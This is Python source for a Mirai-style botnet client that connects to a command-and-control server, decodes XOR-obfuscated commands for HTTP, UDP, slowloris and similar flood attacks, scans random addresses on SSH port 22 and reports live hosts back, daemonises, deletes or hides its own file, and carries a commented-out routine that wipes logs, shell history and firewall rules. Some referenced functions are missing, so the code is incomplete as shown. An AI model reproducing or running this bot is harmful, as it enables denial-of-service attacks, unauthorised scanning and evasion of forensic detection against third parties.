#!/usr/bin/env python3
''' Standard shebang

Importing various libraries:
	socket
	ssl			unused for the purposes of this
	sys
	os
	time
	random	
	threading	handles actual functions
	base64		aliased as b64
'''
import socket
import ssl
import sys
import os
import time
import random
import threading
import base64 as b64

#config
cnc                  = "127.0.0.1"#your cnc ip
cport                = 1337#your cnc port
scan_ip              = "127.0.0.1"#Recevie the scanned ip
scan_port            = 911#same
sport                = 22#Scanning port
single_instance_port = 42026#You should knew this if u used mirai.
scan_th              = 50#Scanner threads
key                  = "asdfghjkloiuytresxcvbnmliuytf"#xor key, don't edit it if u don't know wtf is this
'''
configureable values:
	cnc					=>	IP of your CNC server
	cport				=>	port that your CNC server listens on
	scan_ip				=>	IP
	scan_port			=>	port 
	sport				=>	port to scan nearby IP's
	single_instance_port=>	Mirai specific function (need to research)
	strings				=>	a string for randomized http requests
	stop				=>	Flag used for thread controls and prevent simultaneous attacks from one bot
	scan				=>	Flag to allow scanner function to run on connection
'''

strings = "asdfghlqwertyuiopzxcvbnmASDFGHJKLQWERTYUIOPZXCVBNM1234567890"
stop    = False#threads control
scan    = True#Default turn the scanner on

'''
send_back Function:	ip to send

'''

def send_back(ip):
	try:
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR,1)
		s.settimeout(1)
		s.connect((str(scan_ip),int(scan_port)))
		s.send((xor_enc(ip,key).encode()))
		s.close()
	except:
		pass

def scanner():
	while 1:
		if scan:
			ip = gip()
			try:
				s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
				s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
				s.settimeout(1)
				s.connect((str(ip),int(sport)))
				#print("Scanned sth, "+ip+":"+str(sport))
				s.close()
				send_back(ip+":"+str(sport))
			except:
				pass
		time.sleep(0.03)

def handle(sock):
	global stop
	attack = 0
	sock.send(xor_enc("1337",key).encode())#login code
	while True:
		tmp = sock.recv(1024).decode()
		if len(tmp) == 0:
			break#return main loop
		print(tmp)
		data = xor_dec(tmp,key)
		if data[0] == '!':
			try:
				command = data.split()
				print(command)
				if command[0] == xor_dec('QBAH',key):#encoded keywords: !cc
					if attack != 0:
						stop = True
						attack=0
					stop = False
					for _ in range(int(command[3])):
						p = threading.Thread(target=CC, args=(command[1],command[2]))
						p.start()
					attack+=1
				elif command[0] == xor_dec('QBsQEhc=',key):#encoded keywords: !http
					if attack != 0:
						stop = True
						attack=0
					stop = False
					for _ in range(int(command[3])):
						p = threading.Thread(target=HTTP, args =(command[1],command[2],command[4]))
						p.start()
					attack+=1
				elif command[0] == xor_dec('QAAICRA=',key):#encoded keywords: !slow
					if attack != 0:
						stop = True
						attack=0
					stop = False
					for _ in range(int(command[3])):
						p = threading.Thread(target=SLOW, args =(command[1],command[2],command[4],command[5]))
						p.start()
					attack+=1
				elif command[0] == xor_dec('QAYAFg==',key):#encoded keywords: !udp
					if attack != 0:
						stop = True
						attack=0
					stop = False
					for _ in range(int(command[3])):
						p = threading.Thread(target=UDP, args =(command[1],command[2],command[4]))
						p.start()
					attack+=1
				elif command[0] == xor_dec('QAUXAw==',key):#encoded keyword: !vse
					if attack != 0:
						stop = True
						attack=0
					stop = False
					for _ in range(int(command[3])):
						p = threading.Thread(target=VSE, args =(command[1],command[2]))
						p.start()
					attack+=1
				elif command[0] == xor_dec('QAAQAg==',key):#encoded keyword: !std
					if attack != 0:
						stop = True
						attack=0
					stop = False
					for _ in range(int(command[3])):
						p = threading.Thread(target=STD, args =(command[1],command[2]))
						p.start()
					attack+=1
				elif command[0] == xor_dec('QAAHBwk=',key):
					global scan
					if command[1] == "1":
						scan = True
					if command[1] == "0":
						scan = False
				elif command[0] == xor_dec('QAAQCRc=',key):#!stop
					stop = True
					attack = 0#clear attack list
				elif command[0] == xor_dec('QBgNCgs=',key):#!kill : kill bot
					sock.close()
					return 1
			except:#if have error than will pass
				pass
		if data == xor_dec("ERoKAQ==",key):#ping
			sock.send(xor_enc("pong",key).encode())#keepalive and check connection alive
	return 0

def daemon():#daemon
	pid = os.fork()#first fork
	if pid:
		os._exit(0)
	os.chdir('/')
	os.umask(0)
	os.setsid()
	_pid = os.fork()#second fork for careful, prevent the process from opening a control terminal again
	if _pid:
		os._exit(0)
	sys.stdout.flush()#Refresh buffer
	sys.stderr.flush()
	sys.stdin.close()#off the stdin,stdout,stderr, indeed no need.
	sys.stdout.close()#windows can't use this method, only can use pyinstaller's option '--noconsole'
	sys.stderr.close()

'''These function haven't need to use
def clean_device():#don't use it if u don't want be detected in dbg
	os.system("rm -rf /tmp/* /var/tmp/* /var/run/* /var/*")
	os.system("rm -rf /bin/netstat")
	os.system("cat /dev/null > /var/log/wtmp")
	os.system("iptables -F")
	os.system("service iptables stop")
	os.system("/sbin/iptables -F")
	os.system("/sbin/iptables -X")
	os.system("service firewalld stop")
	os.system("rm -rf ~/.bash_history")
	os.system("history -c")
'''
def kill_port(port):#search in google
	# find pid
	if os.name == "nt": 
		result = os.popen("netstat -aon | findstr " + str(port))
		text = result.read()
		gpid = text.strip().split(' ')[-1]
		# kill pid
		result = os.popen("taskkill -f -pid "+ str(gpid)+" >nul 2>&1")
	else:
		os.system("fuser -k -n tcp "+str(port))#using 'fuser' to kill port

def single_instance():
	try:
		s = socket.socket()
		s.bind(('127.0.0.1',single_instance_port))
		s.listen(1)
		while True:
			global kill
			if kill:
				break
			a, _ = s.accept()
			a.close()
	except:
		try:
			kill_port(single_instance_port)
			single_instance()
		except:
			os.system("kill "+os.getppid())
			os._exit(0)

def conn():
	if len(sys.argv) == 1:#i use 'python client.py debug' to check command
		if os.name != "nt":
			os.system('rm -rf '+sys.argv[0])#delete ourselves
			daemon()#can't use in windows
			#clean_device()
		else:
			#pass
			os.system("attrib +s +a +h "+sys.argv[0])#hide the file
	global kill
	kill = False
	for _ in range(scan_th):
		threading.Thread(target=scanner,daemon=True).start()
	threading.Thread(target=single_instance,daemon=True).start()#only can used in python3
	while True:#magic loop
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR,1)
			s.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
			#s.setsockopt(socket.SOL_TCP, socket.TCP_KEEPIDLE, 10)
			#s.setsockopt(socket.SOL_TCP, socket.TCP_KEEPINTVL, 10)
			#s.setsockopt(socket.SOL_TCP, socket.TCP_KEEPCNT, 3)#this only can use on python3 env, python2 pls off this
			s.connect((cnc,cport))

			signal = handle(s)
			if signal == 1:
				if os.name != "nt":
					sys.stdin  = open("/dev/stdin")#off the stdin,stdout,stderr, indeed no need.
					sys.stdout = open("/dev/stdout")#windows can't use this method, only can use pyinstaller's option '--noconsole'
					sys.stderr = open("/dev/stderr")
				kill = True
				break

		except:
			time.sleep(random.randint(1,60))
			pass

#xor enc part#
def xor_enc(string,key):
	lkey=len(key)
	secret=[]
	num=0
	for each in string:
		if num>=lkey:
			num=num%lkey
		secret.append( chr( ord(each)^ord(key[num]) ) )
		num+=1

	return b64.b64encode( "".join( secret ).encode() ).decode()

def xor_dec(string,key):

	leter = b64.b64decode( string.encode() ).decode()
	lkey=len(key)
	string=[]
	num=0
	for each in leter:
		if num>=lkey:
			num=num%lkey

		string.append( chr( ord(each)^ord(key[num]) ) )
		num+=1

	return "".join( string )
#def gip():
	#while 1:
		#max = 255
		#ip1 = random.randint(0,max)
		#ip2 = random.randint(0,max)
		#ip3 = random.randint(0,max)
		#ip4 = random.randint(0,max)
		#if ip1 == 127 :
			#continue

		#if ip1 == 0 :
			#continue

		#if ip1 == 3 :
			#continue

		#if ip1 == 15 :
			#continue

		#if ip1 == 56 :
			#continue

		#if ip1 == 10 :
			#continue

		#if ip1 == 25 :
			#continue

		#if ip1 == 49 :
			#continue

		#if ip1 == 50 :
			#continue

		#if ip1 == 137 :
			#continue

		# Department ipf Defense
		#if ip1 == 6 :
			#continue

		#if ip1 == 7 :
			#continue

		#if ip1 == 11 :
			#continue

		#if ip1 == 21 :
			#continue

		#if ip1 == 22 :
			#continue

		#if ip1 == 26 :
			#continue

		#if ip1 == 28 :
			#continue

		#if ip1 == 29 :
			#continue

		#if ip1 == 30 :
			#continue

		#if ip1 == 33 :
			#continue

		#if ip1 == 55 :
			#continue

		#if ip1 == 214 :
			#continue

		#if ip1 == 215 :
			#continue

		# End ipf Department ipf Defense
		#if ip1 == 192 and ip2 == 168 :
			#continue

		#if ip1 == 146 and ip2 == 17 :
			#continue

		#if ip1 == 146 and ip2 == 80 :
			#continue

		#if ip1 == 146 and ip2 == 98 :
			#continue

		#if ip1 == 146 and ip2 == 154 :
			#continue

		#if ip1 == 147 and ip2 == 159 :
			#continue

		#if ip1 == 148 and ip2 == 114 :
			#continue

		#if ip1 == 150 and ip2 == 125 :
			#continue

		#if ip1 == 150 and ip2 == 133 :
			#continue

		#if ip1 == 150 and ip2 == 144 :
			#continue

		#if ip1 == 150 and ip2 == 149 :
			#continue

		#if ip1 == 150 and ip2 == 157 :
			#continue

		#if ip1 == 150 and ip2 == 184 :
			#continue

		#if ip1 == 150 and ip2 == 190 :
			#continue

		#if ip1 == 150 and ip2 == 196 :
			#continue

		#if ip1 == 152 and ip2 == 82 :
			#continue

		#if ip1 == 152 and ip2 == 229 :
			#continue

		#if ip1 == 157 and ip2 == 202 :
			#continue

		#if ip1 == 157 and ip2 == 217 :
			#continue

		#if ip1 == 161 and ip2 == 124 :
			#continue

		#if ip1 == 162 and ip2 == 32 :
			#continue

		#if ip1 == 155 and ip2 == 96 :
			#continue

		#if ip1 == 155 and ip2 == 149 :
			#continue

		#if ip1 == 155 and ip2 == 155 :
			#continue

		#if ip1 == 155 and ip2 == 178 :
			#continue

		#if ip1 == 164 and ip2 == 158 :
			#continue

		#if ip1 == 156 and ip2 == 9 :
			#continue

		#if ip1 == 167 and ip2 == 44 :
			#continue

		#if ip1 == 168 and ip2 == 68 :
			#continue

		#if ip1 == 168 and ip2 == 85 :
			#continue

		#if ip1 == 168 and ip2 == 102 :
			#continue

		#if ip1 == 203 and ip2 == 59 :
			#continue

		#if ip1 == 204 and ip2 == 34 :
			#continue

		#if ip1 == 207 and ip2 == 30 :
			#continue

		#if ip1 == 117 and ip2 == 55 :
			#continue

		#if ip1 == 117 and ip2 == 56 :
			#continue

		#if ip1 == 80 and ip2 == 235 :
			#continue

		#if ip1 == 207 and ip2 == 120 :
			#continue

		#if ip1 == 209 and ip2 == 35 :
			#continue

		#if ip1 == 64 and ip2 == 70 :
			#continue

		#if ip1 == 172 and ip2 >= 16 and ip2 < 32 :
			#continue

		#if ip1 == 100 and ip2 >= 64 and ip2 < 127 :
			#continue

		#if ip1 == 169 and ip2 > 254 :
			#continue

		#if ip1 == 198 and ip2 >= 18 and ip2 < 20 :
			#continue

		#if ip1 == 64 and ip2 >= 69 and ip2 < 227 :
			#continue

		#if ip1 == 128 and ip2 >= 35 and ip2 < 237 :
			#continue

		#if ip1 == 129 and ip2 >= 22 and ip2 < 255 :
			#continue

		#if ip1 == 130 and ip2 >= 40 and ip2 < 168 :
			#continue

		#if ip1 == 131 and ip2 >= 3 and ip2 < 251 :
			#continue

		#if ip1 == 132 and ip2 >= 3 and ip2 < 251 :
			#continue

		#if ip1 == 134 and ip2 >= 5 and ip2 < 235 :
			#continue

		#if ip1 == 136 and ip2 >= 177 and ip2 < 223 :
			#continue

		#if ip1 == 138 and ip2 >= 13 and ip2 < 194 :
			#continue

		#if ip1 == 139 and ip2 >= 31 and ip2 < 143 :
			#continue

		#if ip1 == 140 and ip2 >= 1 and ip2 < 203 :
			#continue

		#if ip1 == 143 and ip2 >= 45 and ip2 < 233 :
			#continue

		#if ip1 == 144 and ip2 >= 99 and ip2 < 253 :
			#continue

		#if ip1 == 146 and ip2 >= 165 and ip2 < 166 :
			#continue

		#if ip1 == 147 and ip2 >= 35 and ip2 < 43 :
			#continue

		#if ip1 == 147 and ip2 >= 103 and ip2 < 105 :
			#continue

		#if ip1 == 147 and ip2 >= 168 and ip2 < 170 :
			#continue

		#if ip1 == 147 and ip2 >= 198 and ip2 < 200 :
			#continue

		#if ip1 == 147 and ip2 >= 238 and ip2 < 255 :
			#continue

		#if ip1 == 150 and ip2 >= 113 and ip2 < 115 :
			#continue

		#if ip1 == 152 and ip2 >= 151 and ip2 < 155 :
			#continue

		#if ip1 == 153 and ip2 >= 21 and ip2 < 32 :
			#continue

		#if ip1 == 155 and ip2 >= 5 and ip2 < 10 :
			#continue

		#if ip1 == 155 and ip2 >= 74 and ip2 < 89 :
			#continue

		#if ip1 == 155 and ip2 >= 213 and ip2 < 222 :
			#continue

		#if ip1 == 157 and ip2 >= 150 and ip2 < 154 :
			#continue

		#if ip1 == 158 and ip2 >= 1 and ip2 < 21 :
			#continue

		#if ip1 == 158 and ip2 >= 235 and ip2 < 247 :
			#continue

		#if ip1 == 159 and ip2 >= 120 and ip2 < 121 :
			#continue

		#if ip1 == 160 and ip2 >= 132 and ip2 < 151 :
			#continue

		#if ip1 == 64 and ip2 >= 224 and ip2 < 227 :
			#continue

		# CIA
		#if ip1 == 162 and ip2 >= 45 and ip2 < 47 :
			#continue

		# NASA Kennedy Space Center
		#if ip1 == 163 and ip2 >= 205 and ip2 < 207:
			#continue
		#if ip1 == 164 and ip2 >= 45 and ip2 < 50 :
			#continue
		#if ip1 == 164 and ip2 >= 217 and ip2 < 233 :
			#continue
		# FBI cipntriplled Linux servers & IPs/IP-Ranges
		#if ip1 == 207 and ip2 >= 60 and ip2 < 62 :
			#continue
		# Clipudflare
		#if ip1 == 104 and ip2 >= 16 and ip2 < 31 :
			#continue
		#if ip1 == 193 and ip2 == 164 :
			#continue
		#if ip1 == 120 and ip2 >= 103 and ip2 < 108 :
			#continue
		#if ip1 == 188 and ip2 == 68:
			#continue
		#if ip1 == 78 and ip2 == 46:
			#continue
		#if ip1 >= 224:
			#continue
		#if (ip1 == 178 and ip2 == 128) or (ip1 == 123 and ip2 == 59):
			#continue
		#elif (ip1 == 124 and ip2 == 244 )or (ip1 == 178 and ip2 == 254 )or (ip1 == 185 and ip2 == 168 )or (ip1 == 178 and ip2 == 79):
			#continue
		#ip = str(ip1) + "." + str(ip2) + "." + str(ip3) + "." + str(ip4)
		#return ip

if __name__ == '__main__':
	#Enable this can bypass some sandbox detection
	#time.sleep(30+random.randint(0,60))
	conn()
